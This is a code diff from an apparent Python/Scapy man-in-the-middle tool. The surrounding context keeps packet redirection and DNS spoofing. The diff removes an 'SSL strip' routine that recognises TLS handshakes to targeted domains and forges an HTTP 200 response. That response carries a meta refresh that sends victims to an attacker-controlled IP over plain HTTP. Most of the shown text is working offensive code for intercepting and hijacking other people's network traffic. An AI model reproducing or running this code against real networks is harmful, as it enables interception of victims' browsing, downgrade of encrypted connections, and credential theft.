@@ -80,70 +80,10 @@ def handle_incoming_packet(packet):
             else:
                 redirect_packet(dst_mac, packet)
                 # Detect HTTPS (port 443) and strip to HTTP
-        if packet.haslayer(TCP) and packet[TCP].dport == 443:
-            # Assume it's the first TLS handshake (Client Hello)
-            domain = None
-            if packet.haslayer(Raw):
-                raw_payload = bytes(packet[TCP].payload)
-                if raw_payload[:1] == b'\x16' and raw_payload[1:3] in [b'\x03\x00', b'\x03\x01', b'\x03\x02', b'\x03\x03', b'\x03\x04']: # TLS Handshake
-                    with dns_targets_lock:
-                        for target_domain, redirect_ip in dns_targets.items():
-                            try:
-                                resolved_ips = socket.gethostbyname_ex(target_domain)[2]
-                                if packet[IP].src in resolved_ips:
-                                    domain = target_domain
-                                    break
-                            except socket.gaierror:
-                                log_error(f"Failed to resolve domain {target_domain}")
-            if domain:
-                redirect_http(packet, domain)
-                return  
-
         else:
             redirect_packet(dst_mac, packet)
 
         print_packet_in_json(packet)
-
-
-def redirect_http(packet, domain):
-    try:
-        redirect_html = f"""
-        <html>
-        <head>
-            <meta http-equiv="refresh" content="0; url=http://{attacker_ip}">
-        </head>
-        <body>
-        </body>
-        </html>
-        """.strip()
-
-        http_response = (
-            "HTTP/1.1 200 OK\r\n"
-            "Content-Type: text/html\r\n"
-            f"Content-Length: {len(redirect_html)}\r\n"
-            "Connection: close\r\n\r\n"
-            f"{redirect_html}"
-        )
-
-        log_info(f"[SSL Strip] Redirecting {packet[IP].src} to {domain} via HTTP 200")
-
-        ether = Ether(src=attacker_mac, dst=packet[Ether].src)
-        ip = IP(src=packet[IP].dst, dst=packet[IP].src)
-        tcp = TCP(
-            sport=443,
-            dport=packet[TCP].sport,
-            seq=packet[TCP].ack,
-            ack=packet[TCP].seq + len(packet[TCP].payload),
-            flags="PA"  
-
-        )
-
-        sendp(ether/ip/tcp/http_response, iface=conf.iface, verbose=False)
-        log_info(f"[SSL Strip] Sent fake HTTP 200 redirect to {packet[IP].src} for {domain}")
-
-    except Exception as e:
-        log_error(f"Failed to send SSL strip redirect: {str(e)}")
-
 
 
 def dns_spoof(packet, redirect_ip):
